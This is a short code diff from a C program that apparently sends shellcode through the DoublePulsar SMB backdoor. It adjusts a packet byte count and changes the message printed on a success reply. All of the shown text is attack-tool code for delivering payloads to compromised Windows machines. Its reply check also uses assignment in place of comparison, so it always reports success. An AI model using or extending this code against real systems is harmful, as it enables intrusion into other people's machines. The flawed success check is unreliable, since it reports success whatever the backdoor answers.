@@ -434,7 +434,7 @@ int main(int argc, char* argv[])
 	//patch other values
 	unsigned short TotalDataCount = EntireShellcodeSize;
 	unsigned short DataCount = EntireShellcodeSize;
-	unsigned short byteCount = EntireShellcodeSize + 13;
+	unsigned short byteCount = EntireShellcodeSize + 12;
 
 	*(WORD*)(big_packet + 0x27) = TotalDataCount;
 	*(WORD*)(big_packet + 0x3b) = DataCount;
@@ -476,7 +476,7 @@ int main(int argc, char* argv[])
 
 	if (recvbuff[34] = 0x52)
 	{
-		printf("Doublepulsar returned 82!\n");
+		printf("Doublepulsar returned: Success!\n");
 	}
 
 	else if (recvbuff[34] = 0x62)
